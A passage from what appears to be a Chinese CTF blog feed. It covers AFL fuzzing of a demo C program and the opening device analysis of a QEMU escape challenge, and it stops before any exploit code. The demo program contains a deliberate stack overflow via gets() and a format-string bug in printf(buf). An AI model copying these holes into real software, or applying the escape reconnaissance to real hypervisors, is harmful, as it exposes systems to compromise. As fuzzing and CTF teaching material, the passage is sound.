class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//如果输入的字符串的首字符为F并且长度为6，则异常退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it is good!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);<span class="comment">//存在栈溢出漏洞</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);<span class="comment">//存在格式化字符串漏洞</span></span><br><span class="line">    vuln(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概流程：</p><p>首先是用afl-gcc编译源代码进行插桩，然后以测试文件为输入，然后启动afl-fuzz程序，将testcase作为程序的输入执行程序，afl会在这个testcase的基础上进行自动变异输入，使得程序产生crash，产生了crash就会被记录起来</p><h3 id="编译插桩"><a href="#编译插桩" class="headerlink" title="编译插桩"></a>编译插桩</h3><p>首先是面对上面这类小文件时采取的方法就是直接进行编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-gcc -g -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure><p>但是面对编译项目时，大多会使用到Makefile。如果存在configure的话肯定是可以在里面直接进行修改，如果没有的话可以直接修改Makefile或者添加以下内容:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CC=/path/to/afl/afl-gcc</span><br><span class="line">CXX=/path/to/afl/afl-g++</span><br></pre></td></tr></table></figure><p> 当然面对clang或者clang++的话也是一样的。</p><h3 id="开始FUZZ"><a href="#开始FUZZ" class="headerlink" title="开始FUZZ"></a>开始FUZZ</h3><p>对那些可以直接从stdin读取输入的目标程序来说，语法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i testcase_dir -o findings_dir /path/to/program […params…]</span><br></pre></td></tr></table></figure><p>对从文件读取输入的目标程序来说，要用“@@”，语法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure><p>而对于这里命令为:<code>afl-fuzz -i input_dir -o output_dir ./test</code></p><p>其中-i选项时输入测试文件的目录，-o选项时输出结果文件的目录。</p><p>对于这个简单的例子，测试文件只需要随便输入点东西就行，这里选择输入<code>hello</code></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230318133051229.png"                      alt="image-20230318133051229"                >一般会出现上图中的问题，解决办法就是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line"><span class="built_in">echo</span> core &gt;/proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230318134324644.png"                      alt="image-20230318134324644"                ></p><p>上图就是AFL的界面，上面的内容根据前面的注释基本可以猜出来一二，不过跑了十分钟只跑出了五处crash就挺离谱的，这个跑的结果与testcase和电脑性能以及运气都有一定关系。</p><h3 id="分析crashes"><a href="#分析crashes" class="headerlink" title="分析crashes"></a>分析crashes</h3><h4 id="id-000000-sig-06-src-000001-op-havoc-rep-128样例"><a href="#id-000000-sig-06-src-000001-op-havoc-rep-128样例" class="headerlink" title="id:000000,sig:06,src:000001,op:havoc,rep:128样例"></a><strong>id:000000,sig:06,src:000001,op:havoc,rep:128样例</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  crashes xxd id:000000,sig:06,src:000001,op:havoc,rep:128 </span><br><span class="line">00000000: 8001 8001 92a8 c3e4 c3c3 c3fa c3ea e4c3  ................</span><br><span class="line">00000010: c3c3 fac3 ea04 2310 0423 1000 1010 0000  ......<span class="comment">#..#......</span></span><br><span class="line">00000020: 9b00 1000 009b 0100 f5f5 0423 1000 1010  ...........<span class="comment">#....</span></span><br><span class="line">00000030: 0000 9b00 1000 009b 0100 f5f5 f5f5 f5f5  ................</span><br><span class="line">00000040: f5f5 f5f5 f5f5 f5f5 f5f5 00fa 0423 1000  .............<span class="comment">#..</span></span><br><span class="line">00000050: 1000 0000 20f5 0064 1000 009b 0010 0000  .... ..d........</span><br><span class="line">00000060: 9b01 0001 92fa 0023 1000 1000 0003 2300  .......<span class="comment">#......#.</span></span><br><span class="line">00000070: 6410 0000 9b15                           d.....</span><br></pre></td></tr></table></figure><p>可以猜测为栈溢出</p><h4 id="id-000001-sig-06-src-000001-op-havoc-rep-128样例"><a href="#id-000001-sig-06-src-000001-op-havoc-rep-128样例" class="headerlink" title="id:000001,sig:06,src:000001,op:havoc,rep:128样例"></a><strong>id:000001,sig:06,src:000001,op:havoc,rep:128样例</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  crashes xxd id:000001,sig:06,src:000001,op:havoc,rep:128 </span><br><span class="line">00000000: 7fb8 b7b8 207f 0001 7fb7 f9ff ffff f9ff  .... ...........</span><br><span class="line">00000010: ffff ff17 ffff ffff 7f7f 7fb7 f9ff ffff  ................</span><br><span class="line">00000020: f9ff ffff ff17 ffff ffff e0ff b8ff ffdd  ................</span><br><span class="line">00000030: b8b7 b8da 8008 00f9 fa00 00f9 f087 8080  ................</span><br><span class="line">00000040: 80ff f9ff ffff ff17 ffff ffff 7f7f 7fb7  ................</span><br><span class="line">00000050: f9ff ffff f9ff ffff ff17 ffff ffff ff80  ................</span><br><span class="line">00000060: 69b8 00d8 bdda 80b8 00d8 bdda ff7f 7fb8  i...............</span><br></pre></td></tr></table></figure><p>一样的应该也是栈溢出导致的</p><h4 id="id-000002-sig-11-src-000000-op-flip1-pos-1样例"><a href="#id-000002-sig-11-src-000000-op-flip1-pos-1样例" class="headerlink" title="id:000002,sig:11,src:000000,op:flip1,pos:1样例"></a><strong>id:000002,sig:11,src:000000,op:flip1,pos:1样例</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  crashes xxd id:000002,sig:11,src:000000,op:flip1,pos:1  </span><br><span class="line">00000000: 7425 7374                                t%st</span><br></pre></td></tr></table></figure><p>这里应该是格式化字符串漏洞引起的crash</p><h4 id="id-000003-sig-11-src-000000-op-havoc-rep-64样例"><a href="#id-000003-sig-11-src-000000-op-havoc-rep-64样例" class="headerlink" title="id:000003,sig:11,src:000000,op:havoc,rep:64样例"></a><strong>id:000003,sig:11,src:000000,op:havoc,rep:64样例</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  crashes xxd id:000003,sig:11,src:000000,op:havoc,rep:64 </span><br><span class="line">00000000: 4662 4062 4040 0000 8040 7f40 1000 4040  Fb@b@@...@.@..@@</span><br><span class="line">00000010: 6240 4000 7740 407f 4040 8040 403f 6565  b@@.w@@.@@.@@?ee</span><br><span class="line">00000020: 6565 4044 4040 3340 403f 6565 6565 4040  ee@D@@3@@?eeee@@</span><br><span class="line">00000030: 4040 3340 4040 4040 40                   @@3@@@@@@</span><br></pre></td></tr></table></figure><p>这里应该是以F开头且长度为6引起的crash</p><h4 id="id-000004-sig-11-src-000002-op-havoc-rep-8样例"><a href="#id-000004-sig-11-src-000002-op-havoc-rep-8样例" class="headerlink" title="id:000004,sig:11,src:000002,op:havoc,rep:8样例"></a><strong>id:000004,sig:11,src:000002,op:havoc,rep:8样例</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  crashes xxd id:000004,sig:11,src:000002,op:havoc,rep:8  </span><br><span class="line">00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA</span><br><span class="line">00000010: 4141 4141 1e41 4141 4141 4141 4141 4132  AAAA.AAAAAAAAAA2</span><br><span class="line">00000020: 4141 4141 4141 1e41 4141 4141 4141 4141  AAAAAA.AAAAAAAAA</span><br><span class="line">00000030: 4141 4141 4141 4141 4141 4141 412a 4134  AAAAAAAAAAAAA*A4</span><br><span class="line">00000040: 41b8                                     A.</span><br></pre></td></tr></table></figure><p>这里应该是以A开头并且长度为66引起的crash</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>可以看到上面五个样例基本覆盖了源码中存在的漏洞。</p><h2 id="黑盒下的FUZZ"><a href="#黑盒下的FUZZ" class="headerlink" title="黑盒下的FUZZ"></a>黑盒下的FUZZ</h2><blockquote><p>  黑盒模式需要使用qemu_mode，所以最好从开始就使用源码进行编译，这里可能会出现很多问题，大多都可以在网上搜到解决办法</p></blockquote><p>这里直接使用以下命令进行编译。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g ./test.c -o <span class="built_in">test</span></span><br></pre></td></tr></table></figure><h3 id="开始FUZZ-1"><a href="#开始FUZZ-1" class="headerlink" title="开始FUZZ"></a>开始FUZZ</h3><p>这里的FUZZ选项略有不同，需要加上-Q选项。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i ./input_dir -o ./output_dir -Q ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230318141300808.png"                      alt="image-20230318141300808"                ></p><p>虽然可以看到这里被保存的crashes有6个，比上面的还多一个，但是看total crashes远远少于上面的。可以看出来用qemu的性能远远小于插桩的。</p><p>这里就不再分析输出的crashes文件了。</p><h2 id="文件读取输入的情况"><a href="#文件读取输入的情况" class="headerlink" title="文件读取输入的情况"></a>文件读取输入的情况</h2><p>首先做以下准备</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  input_dir mkdir file</span><br><span class="line">➜  input_dir cp ../../testcases/others/elf/small_exec.elf ./file</span><br><span class="line">➜  afl_test cp /usr/bin/readelf ./</span><br></pre></td></tr></table></figure><p>随后直接进行fuzz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../afl-fuzz -i ./input_dir/file -o ./output_dir -Q ./readelf -a @@</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230318142936126.png"                      alt="image-20230318142936126"                >跑了十分钟一次crash都没有的，当然跑再久应该也是一样的，这里就不再继续跑了。</p><hr><p>参考资料:<br>    <a class="link"   href="https://xz.aliyun.com/t/4314" >https://xz.aliyun.com/t/4314<i class="fas fa-external-link-alt"></i></a><br>    <a class="link"   href="https://www.cjovi.icu/fuzzing/1138.html" >https://www.cjovi.icu/fuzzing/1138.html<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;本篇文章主要是为网鼎杯线下赛做准备，不会涉及到AFL的原理，主要的方向为AFL的使用。&lt;/p&gt;
&lt;h2 id=&quot;AFL-FUZZ介绍&quot;&gt;&lt;a</summary>
      
    
    
    
    <category term="FUZZ" scheme="https://cv196082.gitee.io/categories/FUZZ/"/>
    
    
    <category term="AFL" scheme="https://cv196082.gitee.io/tags/AFL/"/>
    
    <category term="FUZZ" scheme="https://cv196082.gitee.io/tags/FUZZ/"/>
    
  </entry>
  
  <entry>
    <title>q-escape</title>
    <link href="https://cv196082.gitee.io/2023/03/15/q-escape/"/>
    <id>https://cv196082.gitee.io/2023/03/15/q-escape/</id>
    <published>2023-03-15T08:45:50.000Z</published>
    <updated>2023-03-18T06:32:16.260Z</updated>
    
    <content type="html"><![CDATA[<p>许久没有更新，前段时间一直考试所以一直拖着了。</p><h2 id="设备分析"><a href="#设备分析" class="headerlink" title="设备分析"></a>设备分析</h2><p>首先看看开了什么保护</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  q-escape checksec --file=./qemu-system-x86_64 </span><br><span class="line">[*] <span class="string">&#x27;/media/psf/Home/Documents/pwn/qemu_escape/q-escape/qemu-system-x86_64&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>没有开启PIE</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-m 64 \</span><br><span class="line">-initrd ./initramfs.igz \</span><br><span class="line">-kernel ./vmlinuz-4.15.0-36-generic \</span><br><span class="line">-append <span class="string">&quot;priority=low console=ttyS0&quot;</span> \</span><br><span class="line">-nographic \</span><br><span class="line">-L ./pc-bios \</span><br><span class="line">-vga std \</span><br><span class="line">-device cydf-vga \</span><br><span class="line">-monitor telnet:127.0.0.1:2222,server,nowait</span><br></pre></td></tr></table></figure><p>设备名为<code>cydf-vga</code>并且允许连接。</p><p>将qemu-system-x86_64拖入ida中，查找与设备cydf-vga相关的函数。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315122813653.png"                      alt="image-20230315122813653"                ></p><p>先分析cydf_vga_class_init初始化函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">cydf_vga_class_init</span><span class="params">(ObjectClass_0 *klass, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PCIDeviceClass *v2; <span class="comment">// rbx</span></span><br><span class="line">  PCIDeviceClass *v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(</span><br><span class="line">                           klass,</span><br><span class="line">                           <span class="string">&quot;device&quot;</span>,</span><br><span class="line">                           <span class="string">&quot;/home/dr0gba/pwn/seccon/qemu-3.0.0/hw/display/cydf_vga.c&quot;</span>,</span><br><span class="line">                           <span class="number">3223</span>,</span><br><span class="line">                           <span class="string">&quot;cydf_vga_class_init&quot;</span>);</span><br><span class="line">  v3 = (PCIDeviceClass *)object_class_dynamic_cast_assert(</span><br><span class="line">                           klass,</span><br><span class="line">                           <span class="string">&quot;pci-device&quot;</span>,</span><br><span class="line">                           <span class="string">&quot;/home/dr0gba/pwn/seccon/qemu-3.0.0/hw/display/cydf_vga.c&quot;</span>,</span><br><span class="line">                           <span class="number">3224</span>,</span><br><span class="line">                           <span class="string">&quot;cydf_vga_class_init&quot;</span>);</span><br><span class="line">  v3-&gt;realize = pci_cydf_vga_realize;</span><br><span class="line">  v3-&gt;romfile = <span class="string">&quot;vgabios-cydf.bin&quot;</span>;</span><br><span class="line">  v3-&gt;vendor_id = <span class="number">0x1013</span>;</span><br><span class="line">  v3-&gt;device_id = <span class="number">0xB8</span>;</span><br><span class="line">  v3-&gt;class_id = <span class="number">0x300</span>;</span><br><span class="line">  v2-&gt;parent_class.desc = <span class="string">&quot;Cydf CLGD 54xx VGA&quot;</span>;</span><br><span class="line">  v2-&gt;parent_class.categories[<span class="number">0</span>] |= <span class="number">0x20</span>uLL;</span><br><span class="line">  v2-&gt;parent_class.vmsd = &amp;vmstate_pci_cydf_vga;</span><br><span class="line">  v2-&gt;parent_class.props = pci_vga_cydf_properties;</span><br><span class="line">  v2-&gt;parent_class.hotpluggable = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>device_id</code>为0xB8，<code>vendor_id</code>为0x1013，<code>class_id</code>为0x300。并且可以看到父类的描述为<code>Cydf CLGD 54xx VGA</code>。合理猜测是根据原本的改的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  display git:(master) grep -r <span class="string">&#x27;CLGD 54xx VGA&#x27;</span> ./ </span><br><span class="line">./cirrus_vga_rop.h: * QEMU Cirrus CLGD 54xx VGA Emulator.</span><br><span class="line">./cirrus_vga_isa.c: * QEMU Cirrus CLGD 54xx VGA Emulator, ISA bus support</span><br><span class="line">./cirrus_vga_internal.h: * QEMU Cirrus CLGD 54xx VGA Emulator, ISA bus support</span><br><span class="line">./cirrus_vga_rop2.h: * QEMU Cirrus CLGD 54xx VGA Emulator.</span><br><span class="line">./cirrus_vga.c: * QEMU Cirrus CLGD 54xx VGA Emulator.</span><br><span class="line">./cirrus_vga.c:    dc-&gt;desc = <span class="string">&quot;Cirrus CLGD 54xx VGA&quot;</span>;</span><br></pre></td></tr></table></figure><p>事实也是这样的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># lspci</span></span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 0300: 1013:00b8 &lt;-- cydf_vga</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># cat /sys/bus/pci/devices/0000\:00\:04.0/resource</span></span><br><span class="line">0x00000000fa000000 0x00000000fbffffff 0x0000000000042208</span><br><span class="line">0x00000000febc1000 0x00000000febc1fff 0x0000000000040200</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x00000000febb0000 0x00000000febbffff 0x0000000000046200</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>通过这里可以看到三个mmio空间。通过交叉引用，可以找到哪里注册了IO</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315134309905.png"                      alt="image-20230315134309905"                ></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">memory_region_init_io(&amp;s-&gt;cydf_vga_io, owner, &amp;cydf_vga_io_ops, s, <span class="string">&quot;cydf-io&quot;</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">memory_region_init_io(&amp;s-&gt;low_mem, owner, &amp;cydf_vga_mem_ops, s, <span class="string">&quot;cydf-low-memory&quot;</span>, <span class="number">0x20000</span>uLL);</span><br><span class="line">memory_region_init_io(&amp;s-&gt;cydf_mmio_io, owner, &amp;cydf_mmio_io_ops, s, <span class="string">&quot;cydf-mmio&quot;</span>, <span class="number">0x1000</span>uLL);</span><br></pre></td></tr></table></figure><p>这里关注与cydf相关的空间注册，根据大小来看第一个就是pmio，只不过在resource文件内没有范围</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># cat /proc/ioports </span></span><br><span class="line">0000-0cf7 : PCI Bus 0000:00</span><br><span class="line">  0000-001f : dma1</span><br><span class="line">  0020-0021 : pic1</span><br><span class="line">  0040-0043 : timer0</span><br><span class="line">  0050-0053 : timer1</span><br><span class="line">  0060-0060 : keyboard</span><br><span class="line">  0064-0064 : keyboard</span><br><span class="line">  0070-0071 : rtc0</span><br><span class="line">  0080-008f : dma page reg</span><br><span class="line">  00a0-00a1 : pic2</span><br><span class="line">  00c0-00df : dma2</span><br><span class="line">  00f0-00ff : fpu</span><br><span class="line">  0170-0177 : 0000:00:01.1</span><br><span class="line">    0170-0177 : ata_piix</span><br><span class="line">  01f0-01f7 : 0000:00:01.1</span><br><span class="line">    01f0-01f7 : ata_piix</span><br><span class="line">  0376-0376 : 0000:00:01.1</span><br><span class="line">    0376-0376 : ata_piix</span><br><span class="line">  03c0-03df : vga+</span><br><span class="line">  03f6-03f6 : 0000:00:01.1</span><br><span class="line">    03f6-03f6 : ata_piix</span><br><span class="line">  03f8-03ff : serial</span><br><span class="line">  0510-051b : QEMU0002:00</span><br><span class="line">  0600-063f : 0000:00:01.3</span><br><span class="line">    0600-0603 : ACPI PM1a_EVT_BLK</span><br><span class="line">    0604-0605 : ACPI PM1a_CNT_BLK</span><br><span class="line">    0608-060b : ACPI PM_TMR</span><br><span class="line">  0700-070f : 0000:00:01.3</span><br><span class="line">0cf8-0cff : PCI conf1</span><br><span class="line">0d00-ffff : PCI Bus 0000:00</span><br><span class="line">  afe0-afe3 : ACPI GPE0_BLK</span><br><span class="line">  c000-c03f : 0000:00:03.0</span><br><span class="line">  c040-c04f : 0000:00:01.1</span><br><span class="line">    c040-c04f : ata_piix</span><br></pre></td></tr></table></figure><p>可以看到这里存在一个大小刚好为0x30的vga+的端口范围。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315134724201.png"                      alt="image-20230315134724201"                ></p><p>根据定义的函数来看我们还需要找到vga的映射空间，通过这篇文章<a class="link"   href="http://www.osdever.net/FreeVGA/vga/vgamem.htm" >vgamem<i class="fas fa-external-link-alt"></i></a>可以得知vga的映射空间为<code>000a0000-000bffff</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># cat /proc/iomem </span></span><br><span class="line">00000000-00000fff : Reserved</span><br><span class="line">00001000-0009fbff : System RAM</span><br><span class="line">0009fc00-0009ffff : Reserved</span><br><span class="line">000a0000-000bffff : PCI Bus 0000:00</span><br><span class="line">000c0000-000c97ff : Video ROM</span><br><span class="line">000c9800-000ca5ff : Adapter ROM</span><br><span class="line">000ca800-000cadff : Adapter ROM</span><br><span class="line">000f0000-000fffff : Reserved</span><br><span class="line">  000f0000-000fffff : System ROM</span><br><span class="line">00100000-03fdffff : System RAM</span><br><span class="line">  01000000-01c031d0 : Kernel code</span><br><span class="line">  01c031d1-0266a03f : Kernel data</span><br><span class="line">  028e2000-02b3dfff : Kernel bss</span><br><span class="line">03fe0000-03ffffff : Reserved</span><br><span class="line">04000000-febfffff : PCI Bus 0000:00</span><br><span class="line">  fa000000-fbffffff : 0000:00:04.0</span><br><span class="line">  fc000000-fcffffff : 0000:00:02.0</span><br><span class="line">  feb40000-feb7ffff : 0000:00:03.0</span><br><span class="line">  feb80000-feb9ffff : 0000:00:03.0</span><br><span class="line">  febb0000-febbffff : 0000:00:04.0</span><br><span class="line">  febc0000-febc0fff : 0000:00:02.0</span><br><span class="line">  febc1000-febc1fff : 0000:00:04.0</span><br><span class="line">fec00000-fec003ff : IOAPIC 0</span><br><span class="line">fed00000-fed003ff : HPET 0</span><br><span class="line">  fed00000-fed003ff : PNP0103:00</span><br><span class="line">fee00000-fee00fff : Local APIC</span><br><span class="line">fffc0000-ffffffff : Reserved</span><br><span class="line">100000000-17fffffff : PCI Bus 0000:00</span><br></pre></td></tr></table></figure><p>通过注册的大小和所看到的其实地址可以确定是这里<code>000a0000-000bffff : PCI Bus 0000:00</code>。</p><p>并且在源码中也有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/***************************************</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  memory access between 0xa0000-0xbffff</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> ***************************************/</span></span><br></pre></td></tr></table></figure><p>可以看到<code>vga_mem</code>空间在resource文件中并不存在，所以无法像前面一道题一样使用resource0文件去访问内存了。这时我们可以利用<code>/dev/mem</code>文件，<code>dev/mem</code>是物理内存的全映像，可以用来访问物理内存，用mmap来访问物理内存以及外设的IO资源，是实现用户空间驱动的一种方法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 